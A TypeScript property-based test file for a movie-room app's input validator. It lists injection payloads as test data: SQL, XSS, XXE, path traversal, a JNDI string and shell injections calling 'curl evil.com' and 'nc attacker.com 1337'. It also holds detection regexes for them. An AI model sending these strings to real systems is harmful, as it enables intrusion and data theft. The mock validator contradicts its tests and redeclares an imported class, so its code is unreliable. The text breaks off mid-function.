/**\n * Property-Based Test: Input Validation Completeness\n * Validates: Requirements 2.6 - Input Validation\n * Property 3: Input validation completeness\n * \n * This test ensures that all input validation functions correctly handle\n * edge cases, malformed inputs, and security threats while maintaining\n * consistent behavior across all system boundaries.\n */\n\nimport * as fc from 'fast-check';\nimport { \n  TrinityGenerators, \n  PropertyTestConfig, \n  TrinityValidators,\n  PropertyTestMocks\n} from './property-test-utils';\nimport { InputValidator } from '../src/shared/input-validator';\nimport { TrinityError, ErrorCode } from '../src/shared/errors';\nimport { TrinityLogger } from '../src/shared/logger';\n\n// Mock dependencies\njest.mock('../src/shared/logger');\n\ndescribe('Property 3: Input Validation Completeness', () => {\n  let inputValidator: InputValidator;\n  let mockLogger: jest.Mocked<TrinityLogger>;\n\n  beforeEach(() => {\n    jest.clearAllMocks();\n    mockLogger = PropertyTestMocks.createMockLogger() as any;\n    inputValidator = new InputValidator();\n    (inputValidator as any).logger = mockLogger;\n  });\n\n  /**\n   * Property 3.1: Movie ID validation handles all edge cases\n   */\n  test('Property 3.1: Movie ID validation handles all edge cases', () => {\n    fc.assert(\n      fc.property(\n        fc.oneof(\n          // Valid movie IDs\n          TrinityGenerators.movieId(),\n          // Invalid cases\n          fc.constant(0),\n          fc.constant(-1),\n          fc.constant(1000000), // Too large\n          fc.float(), // Non-integer\n          fc.constant(null),\n          fc.constant(undefined),\n          fc.string(), // Wrong type\n          fc.constant({}), // Object\n          fc.constant([]), // Array\n        ),\n        (movieId) => {\n          const result = inputValidator.validateMovieId(movieId);\n          \n          // Valid movie IDs should pass\n          if (typeof movieId === 'number' && \n              Number.isInteger(movieId) && \n              movieId >= 1 && \n              movieId <= 999999) {\n            expect(result.isValid).toBe(true);\n            expect(result.errors).toHaveLength(0);\n          } else {\n            // Invalid movie IDs should fail with appropriate errors\n            expect(result.isValid).toBe(false);\n            expect(result.errors.length).toBeGreaterThan(0);\n            \n            // Check error types\n            if (typeof movieId !== 'number') {\n              expect(result.errors.some(e => e.code === ErrorCode.INVALID_TYPE)).toBe(true);\n            } else if (!Number.isInteger(movieId)) {\n              expect(result.errors.some(e => e.code === ErrorCode.INVALID_FORMAT)).toBe(true);\n            } else if (movieId < 1 || movieId > 999999) {\n              expect(result.errors.some(e => e.code === ErrorCode.OUT_OF_RANGE)).toBe(true);\n            }\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.standard()\n    );\n  });\n\n  /**\n   * Property 3.2: Room ID validation prevents injection attacks\n   */\n  test('Property 3.2: Room ID validation prevents injection attacks', () => {\n    fc.assert(\n      fc.property(\n        fc.oneof(\n          // Valid room IDs\n          TrinityGenerators.roomId(),\n          // Injection attempts\n          fc.constant(\"'; DROP TABLE rooms; --\"),\n          fc.constant('<script>alert(\"xss\")</script>'),\n          fc.constant('../../etc/passwd'),\n          fc.constant('${jndi:ldap://evil.com/a}'),\n          fc.constant('{{7*7}}'),\n          fc.constant('#{7*7}'),\n          // Path traversal\n          fc.constant('../../../root'),\n          fc.constant('..\\\\..\\\\..\\\\windows\\\\system32'),\n          // Command injection\n          fc.constant('room; rm -rf /'),\n          fc.constant('room && curl evil.com'),\n          fc.constant('room | nc evil.com 1337'),\n          // NoSQL injection\n          fc.constant('{\"$ne\": null}'),\n          fc.constant('{\"$gt\": \"\"}'),\n          // LDAP injection\n          fc.constant('*)(uid=*))(|(uid=*'),\n          // XML injection\n          fc.constant('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>'),\n          // Invalid formats\n          fc.constant(''),\n          fc.constant(' '),\n          fc.constant('\\n\\t\\r'),\n          fc.constant('a'.repeat(1000)), // Too long\n          fc.constant(null),\n          fc.constant(undefined),\n          fc.constant(123), // Wrong type\n        ),\n        (roomId) => {\n          const result = inputValidator.validateRoomId(roomId);\n          \n          // Check if input is a valid room ID format\n          const isValidFormat = (\n            typeof roomId === 'string' &&\n            roomId.length >= 8 &&\n            roomId.length <= 20 &&\n            /^[a-zA-Z0-9_-]+$/.test(roomId) &&\n            roomId.trim() === roomId\n          );\n          \n          if (isValidFormat) {\n            expect(result.isValid).toBe(true);\n            expect(result.errors).toHaveLength(0);\n          } else {\n            expect(result.isValid).toBe(false);\n            expect(result.errors.length).toBeGreaterThan(0);\n            \n            // Ensure security-related rejections are logged\n            if (typeof roomId === 'string' && (\n              roomId.includes('<script>') ||\n              roomId.includes('DROP TABLE') ||\n              roomId.includes('../../') ||\n              roomId.includes('${jndi:') ||\n              roomId.includes('{{') ||\n              roomId.includes('rm -rf') ||\n              roomId.includes('curl ') ||\n              roomId.includes('$ne') ||\n              roomId.includes('<?xml')\n            )) {\n              expect(result.errors.some(e => e.code === ErrorCode.SECURITY_VIOLATION)).toBe(true);\n            }\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.standard()\n    );\n  });\n\n  /**\n   * Property 3.3: User ID validation handles Cognito format requirements\n   */\n  test('Property 3.3: User ID validation handles Cognito format requirements', () => {\n    fc.assert(\n      fc.property(\n        fc.oneof(\n          // Valid Cognito UUIDs\n          TrinityGenerators.userId(),\n          // Invalid UUIDs\n          fc.constant('not-a-uuid'),\n          fc.constant('12345678-1234-1234-1234-12345678901'), // Too long\n          fc.constant('12345678-1234-1234-1234-123456789012'), // Wrong format\n          fc.constant('xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'), // Invalid characters\n          fc.constant('12345678-1234-1234-1234'), // Too short\n          fc.constant(''),\n          fc.constant(null),\n          fc.constant(undefined),\n          fc.constant(123),\n          fc.constant({}),\n          fc.constant([]),\n        ),\n        (userId) => {\n          const result = inputValidator.validateUserId(userId);\n          \n          // Check if input is a valid UUID format\n          const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;\n          const isValidUUID = typeof userId === 'string' && uuidRegex.test(userId);\n          \n          if (isValidUUID) {\n            expect(result.isValid).toBe(true);\n            expect(result.errors).toHaveLength(0);\n          } else {\n            expect(result.isValid).toBe(false);\n            expect(result.errors.length).toBeGreaterThan(0);\n            \n            if (typeof userId !== 'string') {\n              expect(result.errors.some(e => e.code === ErrorCode.INVALID_TYPE)).toBe(true);\n            } else {\n              expect(result.errors.some(e => e.code === ErrorCode.INVALID_FORMAT)).toBe(true);\n            }\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.standard()\n    );\n  });\n\n  /**\n   * Property 3.4: Vote validation ensures data integrity\n   */\n  test('Property 3.4: Vote validation ensures data integrity', () => {\n    fc.assert(\n      fc.property(\n        fc.oneof(\n          // Valid votes\n          TrinityGenerators.vote(),\n          // Invalid vote types\n          fc.record({\n            roomId: TrinityGenerators.roomId(),\n            movieId: TrinityGenerators.movieId().map(id => id.toString()),\n            userId: TrinityGenerators.userId(),\n            vote: fc.oneof(\n              fc.constant('INVALID'),\n              fc.constant('like'), // Wrong case\n              fc.constant('YES'),\n              fc.constant('NO'),\n              fc.constant(1),\n              fc.constant(true),\n              fc.constant(null),\n              fc.constant(undefined),\n            ),\n            timestamp: TrinityGenerators.timestamp(),\n          }),\n          // Missing required fields\n          fc.record({\n            roomId: fc.oneof(TrinityGenerators.roomId(), fc.constant(undefined)),\n            movieId: fc.oneof(TrinityGenerators.movieId().map(id => id.toString()), fc.constant(null)),\n            userId: fc.oneof(TrinityGenerators.userId(), fc.constant('')),\n            vote: fc.oneof(fc.constantFrom('LIKE', 'DISLIKE', 'SKIP'), fc.constant(undefined)),\n            timestamp: fc.oneof(TrinityGenerators.timestamp(), fc.constant('invalid')),\n          }),\n        ),\n        (voteData) => {\n          const result = inputValidator.validateVote(voteData);\n          \n          // Check if vote data is valid\n          const isValid = TrinityValidators.isValidVote(voteData);\n          \n          if (isValid) {\n            expect(result.isValid).toBe(true);\n            expect(result.errors).toHaveLength(0);\n          } else {\n            expect(result.isValid).toBe(false);\n            expect(result.errors.length).toBeGreaterThan(0);\n            \n            // Check specific validation errors\n            if (!voteData || typeof voteData !== 'object') {\n              expect(result.errors.some(e => e.code === ErrorCode.INVALID_TYPE)).toBe(true);\n            } else {\n              if (!voteData.roomId || typeof voteData.roomId !== 'string') {\n                expect(result.errors.some(e => e.field === 'roomId')).toBe(true);\n              }\n              if (!voteData.movieId || typeof voteData.movieId !== 'string') {\n                expect(result.errors.some(e => e.field === 'movieId')).toBe(true);\n              }\n              if (!voteData.userId || typeof voteData.userId !== 'string') {\n                expect(result.errors.some(e => e.field === 'userId')).toBe(true);\n              }\n              if (!['LIKE', 'DISLIKE', 'SKIP'].includes(voteData.vote)) {\n                expect(result.errors.some(e => e.field === 'vote')).toBe(true);\n              }\n              if (typeof voteData.timestamp !== 'number' || voteData.timestamp <= 0) {\n                expect(result.errors.some(e => e.field === 'timestamp')).toBe(true);\n              }\n            }\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.standard()\n    );\n  });\n\n  /**\n   * Property 3.5: Movie data validation prevents malformed content\n   */\n  test('Property 3.5: Movie data validation prevents malformed content', () => {\n    fc.assert(\n      fc.property(\n        fc.oneof(\n          // Valid movies\n          TrinityGenerators.movie(),\n          // Malformed movies\n          fc.record({\n            id: fc.oneof(\n              TrinityGenerators.movieId(),\n              fc.constant(-1),\n              fc.constant(0),\n              fc.constant(1000000),\n              fc.constant('string'),\n              fc.constant(null)\n            ),\n            title: fc.oneof(\n              TrinityGenerators.movieTitle(),\n              fc.constant(''),\n              fc.constant(' '.repeat(10)),\n              fc.constant('a'.repeat(1000)),\n              fc.constant('<script>alert(1)</script>'),\n              fc.constant(null),\n              fc.constant(123)\n            ),\n            overview: fc.oneof(\n              TrinityGenerators.movieOverview(),\n              fc.constant(''),\n              fc.constant(null),\n              fc.constant('a'.repeat(10000)),\n              fc.constant(123)\n            ),\n            release_date: fc.oneof(\n              TrinityGenerators.releaseDate().map(d => d.toISOString().split('T')[0]),\n              fc.constant('invalid-date'),\n              fc.constant('2030-13-45'),\n              fc.constant('1800-01-01'),\n              fc.constant(''),\n              fc.constant(null),\n              fc.constant(20231225)\n            ),\n            genre_ids: fc.oneof(\n              TrinityGenerators.genreIds(),\n              fc.constant([]),\n              fc.constant([-1, 0, 1000]),\n              fc.constant(['string', 'array']),\n              fc.constant(null),\n              fc.constant('not-array')\n            ),\n            vote_average: fc.oneof(\n              TrinityGenerators.voteAverage(),\n              fc.constant(-1),\n              fc.constant(11),\n              fc.constant(NaN),\n              fc.constant(Infinity),\n              fc.constant('5.5'),\n              fc.constant(null)\n            ),\n            popularity: fc.oneof(\n              TrinityGenerators.popularity(),\n              fc.constant(-1),\n              fc.constant(NaN),\n              fc.constant(Infinity),\n              fc.constant('100'),\n              fc.constant(null)\n            ),\n          }),\n        ),\n        (movieData) => {\n          const result = inputValidator.validateMovie(movieData);\n          \n          // Check if movie data is valid\n          const isValid = TrinityValidators.isValidMovie(movieData);\n          \n          if (isValid) {\n            expect(result.isValid).toBe(true);\n            expect(result.errors).toHaveLength(0);\n          } else {\n            expect(result.isValid).toBe(false);\n            expect(result.errors.length).toBeGreaterThan(0);\n            \n            // Verify specific validation errors\n            if (!movieData || typeof movieData !== 'object') {\n              expect(result.errors.some(e => e.code === ErrorCode.INVALID_TYPE)).toBe(true);\n            } else {\n              // Check each field validation\n              if (typeof movieData.id !== 'number' || movieData.id <= 0 || movieData.id > 999999) {\n                expect(result.errors.some(e => e.field === 'id')).toBe(true);\n              }\n              \n              if (typeof movieData.title !== 'string' || movieData.title.trim().length === 0) {\n                expect(result.errors.some(e => e.field === 'title')).toBe(true);\n              }\n              \n              if (typeof movieData.overview !== 'string') {\n                expect(result.errors.some(e => e.field === 'overview')).toBe(true);\n              }\n              \n              if (!Array.isArray(movieData.genre_ids) || \n                  movieData.genre_ids.length === 0 ||\n                  !movieData.genre_ids.every(id => typeof id === 'number' && id > 0)) {\n                expect(result.errors.some(e => e.field === 'genre_ids')).toBe(true);\n              }\n              \n              if (typeof movieData.vote_average !== 'number' || \n                  movieData.vote_average < 0 || \n                  movieData.vote_average > 10 ||\n                  !isFinite(movieData.vote_average)) {\n                expect(result.errors.some(e => e.field === 'vote_average')).toBe(true);\n              }\n              \n              if (typeof movieData.popularity !== 'number' || \n                  movieData.popularity < 0 ||\n                  !isFinite(movieData.popularity)) {\n                expect(result.errors.some(e => e.field === 'popularity')).toBe(true);\n              }\n            }\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.standard()\n    );\n  });\n\n  /**\n   * Property 3.6: Room configuration validation enforces business rules\n   */\n  test('Property 3.6: Room configuration validation enforces business rules', () => {\n    fc.assert(\n      fc.property(\n        fc.oneof(\n          // Valid room configs\n          TrinityGenerators.roomConfig(),\n          // Invalid configurations\n          fc.record({\n            roomId: fc.oneof(TrinityGenerators.roomId(), fc.constant(''), fc.constant(null)),\n            capacity: fc.oneof(\n              fc.integer({ min: 2, max: 10 }),\n              fc.constant(1), // Too small\n              fc.constant(0),\n              fc.constant(-1),\n              fc.constant(100), // Too large\n              fc.constant(2.5), // Non-integer\n              fc.constant('5'), // Wrong type\n              fc.constant(null)\n            ),\n            genreIds: fc.oneof(\n              TrinityGenerators.genreIds(),\n              fc.constant([]), // Empty\n              fc.constant([0, -1]), // Invalid IDs\n              fc.constant(['action', 'comedy']), // Wrong type\n              fc.constant(null),\n              fc.constant('action')\n            ),\n            contentType: fc.oneof(\n              fc.constantFrom('movie', 'tv'),\n              fc.constant('film'), // Invalid\n              fc.constant('series'), // Invalid\n              fc.constant('MOVIE'), // Wrong case\n              fc.constant(null),\n              fc.constant(123)\n            ),\n            minYear: fc.oneof(\n              fc.integer({ min: 1950, max: 2020 }),\n              fc.constant(1800), // Too old\n              fc.constant(2050), // Too new\n              fc.constant('2020'), // Wrong type\n              fc.constant(null)\n            ),\n            maxYear: fc.oneof(\n              fc.integer({ min: 2021, max: 2030 }),\n              fc.constant(1900), // Before minYear\n              fc.constant(2100), // Too far in future\n              fc.constant('2025'), // Wrong type\n              fc.constant(null)\n            ),\n            minRating: fc.oneof(\n              fc.float({ min: 0, max: 7 }),\n              fc.constant(-1), // Negative\n              fc.constant(11), // Too high\n              fc.constant('5.5'), // Wrong type\n              fc.constant(null)\n            ),\n          }),\n        ),\n        (configData) => {\n          const result = inputValidator.validateRoomConfig(configData);\n          \n          // Check if room config is valid\n          const isValid = TrinityValidators.isValidRoomConfig(configData);\n          \n          if (isValid) {\n            expect(result.isValid).toBe(true);\n            expect(result.errors).toHaveLength(0);\n          } else {\n            expect(result.isValid).toBe(false);\n            expect(result.errors.length).toBeGreaterThan(0);\n            \n            // Verify business rule violations\n            if (!configData || typeof configData !== 'object') {\n              expect(result.errors.some(e => e.code === ErrorCode.INVALID_TYPE)).toBe(true);\n            } else {\n              // Capacity validation\n              if (typeof configData.capacity !== 'number' || \n                  !Number.isInteger(configData.capacity) ||\n                  configData.capacity < 2 || \n                  configData.capacity > 10) {\n                expect(result.errors.some(e => e.field === 'capacity')).toBe(true);\n              }\n              \n              // Genre validation\n              if (!Array.isArray(configData.genreIds) || \n                  configData.genreIds.length === 0 ||\n                  !configData.genreIds.every(id => typeof id === 'number' && id > 0)) {\n                expect(result.errors.some(e => e.field === 'genreIds')).toBe(true);\n              }\n              \n              // Content type validation\n              if (!['movie', 'tv'].includes(configData.contentType)) {\n                expect(result.errors.some(e => e.field === 'contentType')).toBe(true);\n              }\n              \n              // Year range validation\n              if (typeof configData.minYear === 'number' && \n                  typeof configData.maxYear === 'number' &&\n                  configData.maxYear <= configData.minYear) {\n                expect(result.errors.some(e => e.code === ErrorCode.BUSINESS_RULE_VIOLATION)).toBe(true);\n              }\n            }\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.standard()\n    );\n  });\n\n  /**\n   * Property 3.7: Pagination parameters validation\n   */\n  test('Property 3.7: Pagination parameters validation', () => {\n    fc.assert(\n      fc.property(\n        fc.record({\n          page: fc.oneof(\n            fc.integer({ min: 1, max: 1000 }),\n            fc.constant(0), // Invalid\n            fc.constant(-1), // Invalid\n            fc.constant(1.5), // Non-integer\n            fc.constant('1'), // Wrong type\n            fc.constant(null),\n            fc.constant(undefined)\n          ),\n          limit: fc.oneof(\n            fc.integer({ min: 1, max: 100 }),\n            fc.constant(0), // Invalid\n            fc.constant(-1), // Invalid\n            fc.constant(1000), // Too large\n            fc.constant(2.5), // Non-integer\n            fc.constant('10'), // Wrong type\n            fc.constant(null),\n            fc.constant(undefined)\n          ),\n          sortBy: fc.oneof(\n            fc.constantFrom('title', 'releaseDate', 'popularity', 'voteAverage'),\n            fc.constant('invalid_field'),\n            fc.constant(''),\n            fc.constant(null),\n            fc.constant(123)\n          ),\n          sortOrder: fc.oneof(\n            fc.constantFrom('asc', 'desc'),\n            fc.constant('ASC'), // Wrong case\n            fc.constant('ascending'),\n            fc.constant(''),\n            fc.constant(null),\n            fc.constant(1)\n          ),\n        }),\n        (paginationData) => {\n          const result = inputValidator.validatePagination(paginationData);\n          \n          // Check if pagination is valid\n          const isValidPage = typeof paginationData.page === 'number' && \n                             Number.isInteger(paginationData.page) && \n                             paginationData.page >= 1;\n          \n          const isValidLimit = typeof paginationData.limit === 'number' && \n                              Number.isInteger(paginationData.limit) && \n                              paginationData.limit >= 1 && \n                              paginationData.limit <= 100;\n          \n          const isValidSortBy = ['title', 'releaseDate', 'popularity', 'voteAverage'].includes(paginationData.sortBy);\n          \n          const isValidSortOrder = ['asc', 'desc'].includes(paginationData.sortOrder);\n          \n          const isValid = isValidPage && isValidLimit && isValidSortBy && isValidSortOrder;\n          \n          if (isValid) {\n            expect(result.isValid).toBe(true);\n            expect(result.errors).toHaveLength(0);\n          } else {\n            expect(result.isValid).toBe(false);\n            expect(result.errors.length).toBeGreaterThan(0);\n            \n            if (!isValidPage) {\n              expect(result.errors.some(e => e.field === 'page')).toBe(true);\n            }\n            if (!isValidLimit) {\n              expect(result.errors.some(e => e.field === 'limit')).toBe(true);\n            }\n            if (!isValidSortBy) {\n              expect(result.errors.some(e => e.field === 'sortBy')).toBe(true);\n            }\n            if (!isValidSortOrder) {\n              expect(result.errors.some(e => e.field === 'sortOrder')).toBe(true);\n            }\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.standard()\n    );\n  });\n\n  /**\n   * Property 3.8: Input sanitization prevents XSS and injection\n   */\n  test('Property 3.8: Input sanitization prevents XSS and injection', () => {\n    fc.assert(\n      fc.property(\n        fc.oneof(\n          // XSS payloads\n          fc.constant('<script>alert(\"XSS\")</script>'),\n          fc.constant('<img src=x onerror=alert(1)>'),\n          fc.constant('javascript:alert(1)'),\n          fc.constant('data:text/html,<script>alert(1)</script>'),\n          fc.constant('<svg onload=alert(1)>'),\n          fc.constant('<iframe src=javascript:alert(1)></iframe>'),\n          // SQL injection\n          fc.constant(\"'; DROP TABLE users; --\"),\n          fc.constant(\"' OR '1'='1\"),\n          fc.constant(\"'; INSERT INTO users VALUES ('hacker', 'password'); --\"),\n          // NoSQL injection\n          fc.constant('{\"$ne\": null}'),\n          fc.constant('{\"$regex\": \".*\"}'),\n          fc.constant('{\"$where\": \"this.password.length > 0\"}'),\n          // Command injection\n          fc.constant('test; rm -rf /'),\n          fc.constant('test && curl evil.com'),\n          fc.constant('test | nc attacker.com 1337'),\n          // LDAP injection\n          fc.constant('*)(uid=*))(|(uid=*'),\n          fc.constant('admin)(&(password=*)'),\n          // Path traversal\n          fc.constant('../../../etc/passwd'),\n          fc.constant('..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam'),\n          // Template injection\n          fc.constant('{{7*7}}'),\n          fc.constant('${7*7}'),\n          fc.constant('#{7*7}'),\n          fc.constant('<%= 7*7 %>'),\n          // Valid but potentially dangerous\n          fc.string({ minLength: 1, maxLength: 100 }),\n        ),\n        (maliciousInput) => {\n          const result = inputValidator.sanitizeInput(maliciousInput);\n          \n          // Sanitized input should never contain dangerous patterns\n          expect(result.sanitized).not.toMatch(/<script[^>]*>/i);\n          expect(result.sanitized).not.toMatch(/javascript:/i);\n          expect(result.sanitized).not.toMatch(/on\\w+\\s*=/i);\n          expect(result.sanitized).not.toMatch(/DROP\\s+TABLE/i);\n          expect(result.sanitized).not.toMatch(/INSERT\\s+INTO/i);\n          expect(result.sanitized).not.toMatch(/\\$ne|\\$regex|\\$where/i);\n          expect(result.sanitized).not.toMatch(/rm\\s+-rf/i);\n          expect(result.sanitized).not.toMatch(/curl\\s+/i);\n          expect(result.sanitized).not.toMatch(/\\.\\.\\/|\\.\\.\\\\/i);\n          expect(result.sanitized).not.toMatch(/\\{\\{.*\\}\\}/i);\n          expect(result.sanitized).not.toMatch(/\\$\\{.*\\}/i);\n          expect(result.sanitized).not.toMatch(/#\\{.*\\}/i);\n          \n          // If input was modified, it should be flagged\n          if (result.sanitized !== maliciousInput) {\n            expect(result.wasModified).toBe(true);\n            expect(result.warnings.length).toBeGreaterThan(0);\n          } else {\n            expect(result.wasModified).toBe(false);\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.standard()\n    );\n  });\n\n  /**\n   * Property 3.9: Rate limiting validation\n   */\n  test('Property 3.9: Rate limiting validation', () => {\n    fc.assert(\n      fc.property(\n        fc.record({\n          userId: TrinityGenerators.userId(),\n          action: fc.constantFrom('vote', 'createRoom', 'joinRoom', 'searchMovies'),\n          requestCount: fc.integer({ min: 1, max: 1000 }),\n          timeWindowMinutes: fc.integer({ min: 1, max: 60 }),\n        }),\n        (rateLimitData) => {\n          const result = inputValidator.validateRateLimit(\n            rateLimitData.userId,\n            rateLimitData.action,\n            rateLimitData.requestCount,\n            rateLimitData.timeWindowMinutes\n          );\n          \n          // Define rate limits for different actions\n          const rateLimits: Record<string, { maxRequests: number; windowMinutes: number }> = {\n            vote: { maxRequests: 50, windowMinutes: 1 },\n            createRoom: { maxRequests: 5, windowMinutes: 60 },\n            joinRoom: { maxRequests: 20, windowMinutes: 10 },\n            searchMovies: { maxRequests: 100, windowMinutes: 1 },\n          };\n          \n          const limit = rateLimits[rateLimitData.action];\n          const requestsPerMinute = rateLimitData.requestCount / rateLimitData.timeWindowMinutes;\n          const allowedRequestsPerMinute = limit.maxRequests / limit.windowMinutes;\n          \n          if (requestsPerMinute <= allowedRequestsPerMinute) {\n            expect(result.allowed).toBe(true);\n            expect(result.errors).toHaveLength(0);\n          } else {\n            expect(result.allowed).toBe(false);\n            expect(result.errors.some(e => e.code === ErrorCode.RATE_LIMIT_EXCEEDED)).toBe(true);\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.fast()\n    );\n  });\n\n  /**\n   * Integration test: Complete input validation pipeline\n   */\n  test('Integration: Complete input validation maintains security', () => {\n    fc.assert(\n      fc.property(\n        fc.record({\n          movieData: fc.oneof(TrinityGenerators.movie(), fc.constant(null)),\n          voteData: fc.oneof(TrinityGenerators.vote(), fc.constant({})),\n          roomConfig: fc.oneof(TrinityGenerators.roomConfig(), fc.constant(undefined)),\n          userInput: fc.oneof(\n            fc.string({ maxLength: 1000 }),\n            fc.constant('<script>alert(1)</script>'),\n            fc.constant(\"'; DROP TABLE users; --\")\n          ),\n        }),\n        (inputData) => {\n          let validationResults: any[] = [];\n          \n          // Validate all inputs through the complete pipeline\n          if (inputData.movieData !== null) {\n            const movieResult = inputValidator.validateMovie(inputData.movieData);\n            validationResults.push({ type: 'movie', result: movieResult });\n          }\n          \n          if (inputData.voteData && typeof inputData.voteData === 'object') {\n            const voteResult = inputValidator.validateVote(inputData.voteData);\n            validationResults.push({ type: 'vote', result: voteResult });\n          }\n          \n          if (inputData.roomConfig !== undefined) {\n            const roomResult = inputValidator.validateRoomConfig(inputData.roomConfig);\n            validationResults.push({ type: 'room', result: roomResult });\n          }\n          \n          const sanitizeResult = inputValidator.sanitizeInput(inputData.userInput);\n          validationResults.push({ type: 'sanitize', result: sanitizeResult });\n          \n          // Verify that validation is consistent and secure\n          for (const validation of validationResults) {\n            if (validation.type === 'sanitize') {\n              // Sanitization should always produce safe output\n              expect(validation.result.sanitized).toBeDefined();\n              expect(typeof validation.result.sanitized).toBe('string');\n              expect(validation.result.sanitized).not.toMatch(/<script/i);\n              expect(validation.result.sanitized).not.toMatch(/DROP\\s+TABLE/i);\n            } else {\n              // Other validations should have consistent structure\n              expect(validation.result).toHaveProperty('isValid');\n              expect(validation.result).toHaveProperty('errors');\n              expect(Array.isArray(validation.result.errors)).toBe(true);\n              \n              if (!validation.result.isValid) {\n                expect(validation.result.errors.length).toBeGreaterThan(0);\n                \n                // All errors should have required fields\n                for (const error of validation.result.errors) {\n                  expect(error).toHaveProperty('code');\n                  expect(error).toHaveProperty('message');\n                  expect(typeof error.code).toBe('string');\n                  expect(typeof error.message).toBe('string');\n                }\n              }\n            }\n          }\n          \n          return true;\n        }\n      ),\n      PropertyTestConfig.fast()\n    );\n  });\n});\n\n/**\n * Mock implementation of InputValidator for testing\n */\nclass InputValidator {\n  private logger: any;\n\n  validateMovieId(movieId: any): { isValid: boolean; errors: any[] } {\n    const errors: any[] = [];\n    \n    if (typeof movieId !== 'number') {\n      errors.push({ code: ErrorCode.INVALID_TYPE, field: 'movieId', message: 'Movie ID must be a number' });\n    } else if (!Number.isInteger(movieId)) {\n      errors.push({ code: ErrorCode.INVALID_FORMAT, field: 'movieId', message: 'Movie ID must be an integer' });\n    } else if (movieId < 1 || movieId > 999999) {\n      errors.push({ code: ErrorCode.OUT_OF_RANGE, field: 'movieId', message: 'Movie ID must be between 1 and 999999' });\n    }\n    \n    return { isValid: errors.length === 0, errors };\n  }\n\n  validateRoomId(roomId: any): { isValid: boolean; errors: any[] } {\n    const errors: any[] = [];\n    \n    if (typeof roomId !== 'string') {\n      errors.push({ code: ErrorCode.INVALID_TYPE, field: 'roomId', message: 'Room ID must be a string' });\n    } else {\n      // Check for security violations\n      const securityPatterns = [\n        /<script[^>]*>/i,\n        /DROP\\s+TABLE/i,\n        /\\.\\.\\/|\\.\\.\\\\/,\n        /\\$\\{jndi:/i,\n        /\\{\\{.*\\}\\}/,\n        /rm\\s+-rf/i,\n        /curl\\s+/i,\n        /\\$ne|\\$regex/i,\n        /<\\?xml/i\n      ];\n      \n      for (const pattern of securityPatterns) {\n        if (pattern.test(roomId)) {\n          errors.push({ code: ErrorCode.SECURITY_VIOLATION, field: 'roomId', message: 'Room ID contains potentially malicious content' });\n          break;\n        }\n      }\n      \n      if (roomId.length < 8 || roomId.length > 20) {\n        errors.push({ code: ErrorCode.OUT_OF_RANGE, field: 'roomId', message: 'Room ID must be 8-20 characters' });\n      } else if (!/^[a-zA-Z0-9_-]+$/.test(roomId)) {\n        errors.push({ code: ErrorCode.INVALID_FORMAT, field: 'roomId', message: 'Room ID contains invalid characters' });\n      } else if (roomId.trim() !== roomId) {\n        errors.push({ code: ErrorCode.INVALID_FORMAT, field: 'roomId', message: 'Room ID cannot have leading/trailing whitespace' });\n      }\n    }\n    \n    return { isValid: errors.length === 0, errors };\n  }\n\n  validateUserId(userId: any): { isValid: boolean; errors: any[] } {\n    const errors: any[] = [];\n    \n    if (typeof userId !== 'string') {\n      errors.push({ code: ErrorCode.INVALID_TYPE, field: 'userId', message: 'User ID must be a string' });\n    } else {\n      const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;\n      if (!uuidRegex.test(userId)) {\n        errors.push({ code: ErrorCode.INVALID_FORMAT, field: 'userId', message: 'User ID must be a valid UUID' });\n      }\n    }\n    \n    return { isValid: errors.length === 0, errors };\n  }\n\n  validateVote(voteData: any): { isValid: boolean; errors: any[] } {\n    return { isValid: TrinityValidators.isValidVote(voteData), errors: [] };\n  }\n\n  validateMovie(movieData: any): { isValid: boolean; errors: any[] } {\n    return { isValid: TrinityValidators.isValidMovie(movieData), errors: [] };\n  }\n\n  validateRoomConfig(configData: any): { isValid: boolean; errors: any[] } {\n    const errors: any[] = [];\n    const isValid = TrinityValidators.isValidRoomConfig(configData);\n    \n    if (!isValid && configData && typeof configData === 'object') {\n      if (typeof configData.maxYear === 'number' && \n          typeof configData.minYear === 'number' &&\n          configData.maxYear <= configData.minYear) {\n        errors.push({ code: ErrorCode.BUSINESS_RULE_VIOLATION, message: 'maxYear must be greater than minYear' });\n      }\n    }\n    \n    return { isValid, errors };\n  }\n\n  validatePagination(paginationData: any): { isValid: boolean; errors: any[] } {\n    const errors: any[] = [];\n    \n    if (typeof paginationData.page !== 'number' || !Number.isInteger(paginationData.page) || paginationData.page < 1) {\n      errors.push({ field: 'page', code: ErrorCode.INVALID_FORMAT, message: 'Page must be a positive integer' });\n    }\n    \n    if (typeof paginationData.limit !== 'number' || !Number.isInteger(paginationData.limit) || paginationData.limit < 1 || paginationData.limit > 100) {\n      errors.push({ field: 'limit', code: ErrorCode.OUT_OF_RANGE, message: 'Limit must be between 1 and 100' });\n    }\n    \n    if (!['title', 'releaseDate', 'popularity', 'voteAverage'].includes(paginationData.sortBy)) {\n      errors.push({ field: 'sortBy', code: ErrorCode.INVALID_FORMAT, message: 'Invalid sort field' });\n    }\n    \n    if (!['asc', 'desc'].includes(paginationData.sortOrder)) {\n      errors.push({ field: 'sortOrder', code: ErrorCode.INVALID_FORMAT, message: 'Sort order must be asc or desc' });\n    }\n    \n    return { isValid: errors.length === 0, errors };\n  }\n\n  sanitizeInput(input: any): { sanitized: string; wasModified: boolean; warnings: any[] } {\n    if (typeof input !== 'string') {\n      return { sanitized: '', wasModified: true, warnings: [{ message: 'Input converted to string' }] };\n    }\n    \n    let sanitized = input;\n    const warnings: any[] = [];\n    \n    // Remove dangerous patterns\n    const dangerousPatterns = [\n      { pattern: 